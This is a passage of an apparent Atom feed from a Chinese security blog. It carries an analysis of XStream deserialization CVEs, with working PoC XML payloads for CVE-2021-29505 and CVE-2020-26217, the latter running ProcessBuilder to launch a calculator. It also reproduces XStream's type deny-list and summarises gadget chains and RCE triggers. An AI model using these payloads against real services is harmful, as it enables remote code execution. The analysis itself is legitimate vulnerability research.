class="string">&quot;.*\\.bcel\\..*\\.util\\.ClassLoader&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern LAZY_ITERATORS = Pattern.compile(<span class="string">&quot;.*\\$LazyIterator&quot;</span>);</span><br><span class="line">denyTypeHierarchy(InputStream.class);</span><br><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-29505"><a href="#CVE-2021-29505" class="headerlink" title="CVE-2021-29505"></a>CVE-2021-29505</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;string&gt;foo&lt;&#x2F;string&gt;</span><br><span class="line">    &lt;string&gt;foo&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;com.sun.jndi.rmi.registry.BindingEnumeration&gt;</span><br><span class="line">      &lt;ctx&gt;</span><br><span class="line">        &lt;environment&#x2F;&gt;</span><br><span class="line">        &lt;registry class&#x3D;&quot;sun.rmi.registry.RegistryImpl_Stub&quot; serialization&#x3D;&quot;custom&quot;&gt;</span><br><span class="line">          &lt;java.rmi.server.RemoteObject&gt;</span><br><span class="line">            &lt;string&gt;UnicastRef&lt;&#x2F;string&gt;</span><br><span class="line">            &lt;string&gt;127.0.0.1&lt;&#x2F;string&gt;</span><br><span class="line">            &lt;int&gt;1099&lt;&#x2F;int&gt;</span><br><span class="line">            &lt;long&gt;0&lt;&#x2F;long&gt;</span><br><span class="line">            &lt;int&gt;0&lt;&#x2F;int&gt;</span><br><span class="line">            &lt;long&gt;0&lt;&#x2F;long&gt;</span><br><span class="line">            &lt;short&gt;0&lt;&#x2F;short&gt;</span><br><span class="line">            &lt;boolean&gt;false&lt;&#x2F;boolean&gt;</span><br><span class="line">          &lt;&#x2F;java.rmi.server.RemoteObject&gt;</span><br><span class="line">        &lt;&#x2F;registry&gt;</span><br><span class="line">        &lt;host&gt;127.0.0.1&lt;&#x2F;host&gt;</span><br><span class="line">        &lt;port&gt;1099&lt;&#x2F;port&gt;</span><br><span class="line">      &lt;&#x2F;ctx&gt;</span><br><span class="line">      &lt;names&gt;</span><br><span class="line">        &lt;string&gt;aa&lt;&#x2F;string&gt;</span><br><span class="line">      &lt;&#x2F;names&gt;</span><br><span class="line">      &lt;nextName&gt;0&lt;&#x2F;nextName&gt;</span><br><span class="line">    &lt;&#x2F;com.sun.jndi.rmi.registry.BindingEnumeration&gt;</span><br><span class="line">    &lt;com.sun.jndi.rmi.registry.BindingEnumeration reference&#x3D;&quot;..&#x2F;com.sun.jndi.rmi.registry.BindingEnumeration&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">&lt;&#x2F;map&gt;</span><br></pre></td></tr></table></figure><h2 id="XStream的防御措施"><a href="#XStream的防御措施" class="headerlink" title="XStream的防御措施"></a>XStream的防御措施</h2><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><p>在&gt;1.4.6之后的版本中，XStream引入了安全机制，以避免反序列化问题。</p><p>Wh1t3p1g师傅《回顾XStream反序列化漏洞》一文中0x03一节中解释得很好了，这里不赘述。贴一下参考【2】中提到的最新版1.4.16的黑名单。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ANNOTATION_MAPPER_TYPE = <span class="string">&quot;com.thoughtworks.xstream.mapper.AnnotationMapper&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern GETTER_SETTER_REFLECTION = Pattern.compile(<span class="string">&quot;.*\\$GetterSetterReflection&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern PRIVILEGED_GETTER = Pattern.compile(<span class="string">&quot;.*\\$PrivilegedGetter&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern LAZY_ITERATORS = Pattern.compile(<span class="string">&quot;.*\\$LazyIterator&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern JAXWS_ITERATORS = Pattern.compile(<span class="string">&quot;.*\\$ServiceNameIterator&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern JAVAFX_OBSERVABLE_LIST__ = Pattern.compile(<span class="string">&quot;javafx\\.collections\\.ObservableList\\$.*&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern JAVAX_CRYPTO = Pattern.compile(<span class="string">&quot;javax\\.crypto\\..*&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern BCEL_CL = Pattern.compile(<span class="string">&quot;.*\\.bcel\\..*\\.util\\.ClassLoader&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">setupSecurity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.securityMapper != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.addPermission(AnyTypePermission.ANY);</span><br><span class="line">        <span class="keyword">this</span>.denyTypes(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;java.beans.EventHandler&quot;</span>, <span class="string">&quot;java.lang.ProcessBuilder&quot;</span>, <span class="string">&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span>, <span class="string">&quot;jdk.nashorn.internal.objects.NativeString&quot;</span>, <span class="string">&quot;com.sun.corba.se.impl.activation.ServerTableEntry&quot;</span>, <span class="string">&quot;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&quot;</span>, <span class="string">&quot;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&quot;</span>, <span class="string">&quot;sun.swing.SwingLazyValue&quot;</span>&#125;);</span><br><span class="line">        <span class="keyword">this</span>.denyTypesByRegExp(<span class="keyword">new</span> Pattern[]&#123;LAZY_ITERATORS, GETTER_SETTER_REFLECTION, PRIVILEGED_GETTER, JAVAX_CRYPTO, JAXWS_ITERATORS, JAVAFX_OBSERVABLE_LIST__, BCEL_CL&#125;);</span><br><span class="line">        <span class="keyword">this</span>.denyTypeHierarchy(InputStream.class);</span><br><span class="line">        <span class="keyword">this</span>.denyTypeHierarchyDynamically(<span class="string">&quot;java.nio.channels.Channel&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.denyTypeHierarchyDynamically(<span class="string">&quot;javax.sql.rowset.BaseRowSet&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.allowTypeHierarchy(Exception.class);</span><br><span class="line">        <span class="keyword">this</span>.securityInitialized = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自此，把基于jdk的现有已知链都block掉了。第三方的链（如Groovy）还在存活中，之后的发展趋势，不知道会不会类似fastjson/jackson之类的，开始漫长的block三方链。</p><h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><p>XStream在1.4.10版本增加了setupDefaultSecurity方式来设置默认的白名单，仅默认支持基础类的实例化。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本节复现了1.4.6之后的几个POC，主要是跟踪RCE漏洞触发点，至于链是如何构造的本节未做研究，这个作为下节的内容重点研究研究。</p><p>过程中遗留了1个现在解决不了的问题，CVE-2021-21347 8u60下的URLClassLoader构造存在问题，未解决，如果有大佬遇到并解决，求分享，不胜感激。</p><h4 id="总结下XStream的反序列化特点"><a href="#总结下XStream的反序列化特点" class="headerlink" title="总结下XStream的反序列化特点"></a>总结下XStream的反序列化特点</h4><ol><li><p>在Java原生反序列化中，可实例化的类必须是Serializable的，但是XStream不受限制所有类都可以实例化，这点和fastjson/jackson之类的一样。</p></li><li><p>fastjson/jackson实现类属性赋值，都是通过getsettr/setsettr来实现的（只是有些调用条件不同），XStream是通过Conveter的逻辑来实现（SerializableConveter也支持Java原生反序列化readObject）。</p><ul><li>为什么fastjson/jackson 存在jdk反序列化链没有XStream的多？因为并不是所有的类的属性都严格实现了get/set，导致很多jdk类不能完全还原。</li></ul></li><li><p>XStream的某些Conveter是存在问题的</p><ul><li>MapConverter/TreeSetConveter/TreeMapConveter都会触发这些集合/表 内元素的内部函数，比如compare、hashcode、equal这些函数。</li><li>DynamicProxyConverter 代理类，InvocationHandler可控，导致一些invoke存在RCE风险的InvocationHandler类，如EventHandler，可以加以利用。</li></ul></li></ol><h4 id="总结下RCE触发点"><a href="#总结下RCE触发点" class="headerlink" title="总结下RCE触发点"></a>总结下RCE触发点</h4><ol><li>invoke 实现上有问题的 InvokeHandler，如<ul><li>EventHandler</li><li>搭配MethodClosure的ConvertedClosure</li></ul></li><li>hashCode、compare、equal实现有问题的Map/Set/Queue，如<ul><li>Expando，hashCode搭配MethodClosure可以RCE</li><li>CVE-2021-21345 ServerTableEntry verify方法可RCE</li></ul></li><li>存在invoke，且method、obj可控的class（这一类普遍存在）<ul><li>CVE-2020-26217 ImageIO$ContainsFilter，filter方法内可控</li><li>CVE-2021-21344 Accessor$GetterSetterReflection，get方法可控</li><li>CVE-2021-21351 IncrementalSAXSource_Xerces parseSome方法内invoke可控</li></ul></li><li>利用ClassLoader实例化<ul><li>ServiceLoader$LazyIterator，调用点为Class.forName (name,initialize,loader) ，指定loader为BCEL classLoaer</li><li>CVE-2021-21347，调用点为loader.loadClass(name).newInstance()，利用java.net.URLClassLoader加载远程jar类并实例化</li><li>CVE-2021-21350，和LazyIterator一样，利用BCEL classLoader</li></ul></li></ol><h4 id="总结下Bullet-ysomap概念"><a href="#总结下Bullet-ysomap概念" class="headerlink" title="总结下Bullet(ysomap概念)"></a>总结下Bullet(ysomap概念)</h4><ol><li>ProcessBuilder.start() 无参数</li><li>Runtime.getRuntime().exec(cmd) 有参</li><li>JdbcRowSetImpl.connect()/prepare()/getDatabaseMetaData()/setAutoCommit(var1) 无参</li><li>MethodClosure.call() 无参</li></ol><p>有参的case比较少见，GroovyConvertedClosure是一例</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://www.anquanke.com/post/id/204314">回顾XStream反序列化漏洞</a></li><li>[2] <a href="https://paper.seebug.org/1543/">Xstream 反序列化远程代码执行漏洞深入分析</a></li><li>[3] <a href="https://x-stream.github.io/CVE-2020-26217.html">CVE-2020-26217</a></li><li>[4] <a href="https://x-stream.github.io/CVE-2021-21344.html">CVE-2021-21344</a></li><li>[5] <a href="https://x-stream.github.io/CVE-2021-21345.html">CVE-2021-21345</a></li><li>[6] <a href="https://x-stream.github.io/CVE-2021-21346.html">CVE-2021-21346</a></li><li>[7] <a href="https://x-stream.github.io/CVE-2021-21347.html">CVE-2021-21347</a></li><li>[8] <a href="https://x-stream.github.io/CVE-2021-21350.html">CVE-2021-21350</a></li><li>[9] <a href="https://x-stream.github.io/CVE-2021-21351.html">CVE-2021-21351</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;前文已经讲过XStream的反序列化特性及漏洞产生的原因，以及&amp;lt;=1.4.6版本的几个gadget，在此背景上，本节准备复现披露的几个RCE CVE，正向分析下。&lt;/p&gt;
&lt;p&gt;XStream团队很有意思，安全公告会把POC也公开，具体可以看&lt;a href=&quot;https://x-stream.github.io/security.html%E3%80%82&quot;&gt;https://x-stream.github.io/security.html。&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;CVE-2020-26217&quot;&gt;&lt;a href=&quot;#CVE-2020-26217&quot; class=&quot;headerlink&quot; title=&quot;CVE-2020-26217&quot;&gt;&lt;/a&gt;CVE-2020-26217&lt;/h2&gt;&lt;p&gt;这个其实就是Wh1t3p1g师傅中提到的第4个ImageIO gadget，在marshalsec gadgets ImageIO中也有，下面正向跟踪下。&lt;/p&gt;
&lt;h3 id=&quot;Wh1t3p1g师傅的POC&quot;&gt;&lt;a href=&quot;#Wh1t3p1g师傅的POC&quot; class=&quot;headerlink&quot; title=&quot;Wh1t3p1g师傅的POC&quot;&gt;&lt;/a&gt;Wh1t3p1g师傅的POC&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;map&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;entry&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;jdk.nashorn.internal.objects.NativeString&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;lt;flags&amp;gt;0&amp;lt;&amp;#x2F;flags&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;lt;value class&amp;#x3D;&amp;quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;dataHandler&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &amp;lt;dataSource class&amp;#x3D;&amp;quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;lt;is class&amp;#x3D;&amp;quot;javax.crypto.CipherInputStream&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;cipher class&amp;#x3D;&amp;quot;javax.crypto.NullCipher&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;initialized&amp;gt;false&amp;lt;&amp;#x2F;initialized&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;opmode&amp;gt;0&amp;lt;&amp;#x2F;opmode&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;serviceIterator class&amp;#x3D;&amp;quot;javax.imageio.spi.FilterIterator&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;iter class&amp;#x3D;&amp;quot;javax.imageio.spi.FilterIterator&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;iter class&amp;#x3D;&amp;quot;java.util.Collections$EmptyIterator&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;next class&amp;#x3D;&amp;quot;java.lang.ProcessBuilder&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;command class&amp;#x3D;&amp;quot;java.util.Arrays$ArrayList&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &amp;lt;a class&amp;#x3D;&amp;quot;string-array&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                          &amp;lt;string&amp;gt;open&amp;lt;&amp;#x2F;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                          &amp;lt;string&amp;gt;-a&amp;lt;&amp;#x2F;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                          &amp;lt;string&amp;gt;calculator.app&amp;lt;&amp;#x2F;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &amp;lt;&amp;#x2F;a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;&amp;#x2F;command&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;redirectErrorStream&amp;gt;false&amp;lt;&amp;#x2F;redirectErrorStream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;&amp;#x2F;next&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;&amp;#x2F;iter&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;filter class&amp;#x3D;&amp;quot;javax.imageio.ImageIO$ContainsFilter&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;method&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;class&amp;gt;java.lang.ProcessBuilder&amp;lt;&amp;#x2F;class&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;name&amp;gt;start&amp;lt;&amp;#x2F;name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;parameter-types&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;&amp;#x2F;method&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;name&amp;gt;foo&amp;lt;&amp;#x2F;name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;&amp;#x2F;filter&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;next class&amp;#x3D;&amp;quot;string&amp;quot;&amp;gt;foo&amp;lt;&amp;#x2F;next&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;&amp;#x2F;serviceIterator&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;lock&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;&amp;#x2F;cipher&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;input class&amp;#x3D;&amp;quot;java.lang.ProcessBuilder$NullInputStream&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;ibuffer&amp;gt;&amp;lt;&amp;#x2F;ibuffer&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;done&amp;gt;false&amp;lt;&amp;#x2F;done&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;ostart&amp;gt;0&amp;lt;&amp;#x2F;ostart&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;ofinish&amp;gt;0&amp;lt;&amp;#x2F;ofinish&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;closed&amp;gt;false&amp;lt;&amp;#x2F;closed&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;lt;&amp;#x2F;is&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;lt;consumed&amp;gt;false&amp;lt;&amp;#x2F;consumed&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &amp;lt;&amp;#x2F;dataSource&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &amp;lt;transferFlavors&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;&amp;#x2F;dataHandler&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;dataLen&amp;gt;0&amp;lt;&amp;#x2F;dataLen&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;lt;&amp;#x2F;value&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;&amp;#x2F;jdk.nashorn.internal.objects.NativeString&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;jdk.nashorn.internal.objects.NativeString reference&amp;#x3D;&amp;quot;..&amp;#x2F;jdk.nashorn.internal.objects.NativeString&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;&amp;#x2F;entry&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;entry&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;jdk.nashorn.internal.objects.NativeString reference&amp;#x3D;&amp;quot;..&amp;#x2F;..&amp;#x2F;entry&amp;#x2F;jdk.nashorn.internal.objects.NativeString&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;jdk.nashorn.internal.objects.NativeString reference&amp;#x3D;&amp;quot;..&amp;#x2F;..&amp;#x2F;entry&amp;#x2F;jdk.nashorn.internal.objects.NativeString&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;&amp;#x2F;entry&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&amp;#x2F;map&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="XStream" scheme="http://m0d9.me/tags/XStream/"/>
    
  </entry>
  
  <entry>
    <title>XStream反序列化详解（一）</title>
    <link href="http://m0d9.me/2021/05/08/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://m0d9.me/2021/05/08/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-05-08T09:17:00.000Z</published>
    <updated>2022-03-21T06:02:00.586Z</updated>
    
